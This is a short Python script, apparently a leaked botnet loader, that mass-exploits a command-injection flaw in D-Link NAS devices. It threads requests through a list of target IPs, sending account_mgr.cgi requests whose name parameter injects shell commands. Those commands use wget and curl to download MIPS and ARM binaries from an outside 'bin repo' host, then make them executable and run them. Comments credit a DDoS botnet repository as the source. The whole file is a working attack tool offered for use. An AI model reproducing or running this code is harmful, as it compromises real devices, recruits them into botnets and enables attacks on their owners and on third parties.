#!/usr/bin/env python3

# 2024 dlink nas sploit loader made and leaked by seth
# i stole this code from https://github.com/R00tS3c/DDOS-RootSec/blob/master/Botnets/Exploits/alcatel.py ^_^

import threading
import random
import socket
import time
import sys
import requests
import re
import os
import subprocess

if len(sys.argv) < 3:
    print("\033[37mUsage: python " + sys.argv[0] + " <list> <port>\033[37m")
    sys.exit()

bins_ip = "1.3.3.7"  # bin repo ip
vulns = open(sys.argv[1], "r").readlines()
port = int(sys.argv[2]) # whatever port the router control panel is on

class SendPayload(threading.Thread):
    def __init__(self, ip):
        threading.Thread.__init__(self)
        self.ip = ip.strip()

    def run(self):
        try:
            # edit this, yes its mips AND arm
            url = f"http://{self.ip}:{port}/cgi-bin/account_mgr.cgi?cmd=cgi_user_add&name=';wget http://{bins_ip}/mips; curl -O http://{bins_ip}/mips; chmod +x mips; ./mips; wget http://{bins_ip}/arm7; curl -O http://{bins_ip}/arm7; chmod +x arm7; ./arm7;'"
            requests.get(url, timeout=8)
            print(f"[dlink nas] loading {self.ip}")
        except Exception:
            pass

for IP in vulns:
    try:
        ip = IP.strip()
        t = SendPayload(ip)
        t.start()
        time.sleep(0.03)
    except Exception:
        pass